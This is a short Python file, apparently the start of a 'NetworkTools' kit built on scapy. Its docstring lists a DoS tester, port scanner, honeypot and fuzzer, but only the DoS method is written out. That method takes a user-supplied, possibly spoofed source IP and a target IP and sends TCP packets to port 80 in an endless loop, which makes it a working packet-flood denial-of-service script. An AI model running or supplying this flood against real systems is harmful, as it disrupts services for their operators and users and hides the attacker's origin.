import pyinputplus as pyip
from scapy.all import *

class NetworkTools :
    '''
    1- Net DoS Tester
    2- TCP port Scanner
    3- Honeypot
    4- Fuzzer
    5- DNS and host gathering
    6- Mac address geolocation (samy.pl)
    '''

    def dos_tester(self):
        source_IP = input("Enter IP address of Source: ")
        target_IP = input("Enter IP address of Target: ")
        source_port = int(input("Enter Source Port Number:"))
        i = 1

        while True:
            IP1 = IP(src = source_IP, dst = target_IP)
            TCP1 = TCP(sport = source_port, dport = 80)
            pkt = IP1 / TCP1
            send(pkt, inter = .001)
            print ("packet sent ", i)
            i = i + 1

